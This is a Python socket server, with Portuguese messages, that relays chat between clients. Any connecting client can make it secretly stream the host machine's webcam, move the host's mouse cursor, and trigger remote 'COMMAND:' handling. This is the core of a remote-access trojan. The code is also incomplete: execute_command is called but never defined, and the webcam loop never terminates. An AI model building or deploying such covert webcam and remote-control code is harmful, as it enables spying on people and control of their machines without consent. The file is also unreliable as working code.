import socket
import threading
import pyautogui
import cv2
import base64
import os
import subprocess
from pynput.mouse import Controller
from pynput.mouse import Listener
import screeninfo

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5003
MAX_CONNECTIONS = 5

clients = []

def invert_mouse_movement():
    screen = screeninfo.get_monitors()[0]
    screen_width = screen.width
    screen_height = screen.height
    
    mouse_controller = Controller()

    current_position = mouse_controller.position
    
    inverted_x = screen_width - current_position[0]
    inverted_y = screen_height - current_position[1]
    
    mouse_controller.position = (inverted_x, inverted_y)
    
    print(f"Movimento do mouse invertido para: ({inverted_x}, {inverted_y})")

def broadcast(message, client):
    """ Envia a mensagem para todos os clientes conectados, exceto o remetente """
    for c in clients:
        if c != client:
            try:
                c.send(message)
            except:
                clients.remove(c)

def handle_client(client_socket, client_address):
    clients.append(client_socket)
    print(f"Novo cliente conectado: {client_address}")
    

    broadcast(f"Novo cliente conectado: {client_address}\n".encode(), client_socket)
    
    try:
        while True:
            message = client_socket.recv(1024)
            if not message:
                break  
            
            if message == b'GET_WEBCAM':
                capture_and_send_webcam(client_socket)
            elif message.startswith(b'COMMAND:'):
                command = message.decode('utf-8')[8:]
                execute_command(command)  
                
                if command == "invert_mouse":
                    invert_mouse_movement()  
                
                client_socket.send(f"Comando {command} executado".encode())
            else:
                broadcast(message, client_socket)

    except Exception as e:
        print(f"Erro com o cliente {client_address}: {e}")
    finally:
        
        clients.remove(client_socket)
        broadcast(f"Cliente {client_address} desconectado.\n".encode(), client_socket)
        client_socket.close()
        print(f"Cliente {client_address} desconectado.")

def capture_and_send_webcam(client_socket):
    cap = cv2.VideoCapture(0)
    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break
        
        _, buffer = cv2.imencode('.jpg', frame)
        frame_bytes = buffer.tobytes()
        client_socket.send(base64.b64encode(frame_bytes))  
    
    cap.release()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((SERVER_HOST, SERVER_PORT))
    server.listen(MAX_CONNECTIONS)
    
    print(f"Servidor iniciado em {SERVER_HOST}:{SERVER_PORT}")
    
    while True:
        client_socket, client_address = server.accept()
        print(f"Cliente conectado de {client_address}")
        
        
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

if __name__ == "__main__":
    start_server()
